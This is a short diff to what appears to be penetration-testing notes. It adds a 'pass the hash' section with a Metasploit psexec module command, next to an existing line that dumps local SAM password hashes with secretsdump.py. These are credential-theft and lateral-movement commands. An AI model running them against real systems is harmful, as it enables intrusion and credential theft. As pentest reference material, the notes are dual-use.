@@ -44,3 +44,6 @@ pip install -r requirements.txt
 python3 setup.py install
 secretsdump.py -sam sam -system system LOCAL
 ~~~
+
+### PASS THE HASH
+use exploit/windows/smb/psexec
